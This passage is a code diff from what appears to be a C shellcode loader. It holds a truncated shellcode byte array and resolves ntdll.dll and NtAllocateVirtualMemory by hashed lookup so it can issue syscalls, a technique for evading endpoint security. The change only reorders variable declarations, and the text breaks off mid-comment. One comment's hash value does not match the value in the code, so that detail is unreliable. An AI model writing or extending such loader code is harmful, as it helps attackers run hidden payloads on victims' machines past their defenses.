@@ -209,10 +209,6 @@ int main() {
     const char shellcode[] = "\xfc\x48\x83...";
 
 
-
-    PVOID BaseAddress = NULL; // Base address for the shellcode
-    SIZE_T RegionSize = sizeof(shellcode); // Size of the shellcode region
-
     LPVOID addr = NULL; // Address of the function in ntdll.dll
     DWORD syscallNum = NULL; // Syscall number
     INT_PTR syscallAddr = NULL; // Address of the syscall instruction
@@ -220,8 +216,9 @@ int main() {
     // Retrieve handle to ntdll.dll
     HMODULE ntdll = GetModule(4097367);
 
-    //--------------------------------------------------------------------------------------------------------------------------------
 
+    PVOID BaseAddress = NULL; // Base address for the shellcode
+    SIZE_T RegionSize = sizeof(shellcode); // Size of the shellcode region
 
     addr = GetFunctionAddr(ntdll, 18887768681269);      // Retrieve the address of the function within ntdll.dll that corresponds to the hash 8454456120 (NtAllocateVirtualMemory)
     syscallNum = GetsyscallNum(addr);		           // Based on the address of the function, use the GetSyscallNum function to get the S  
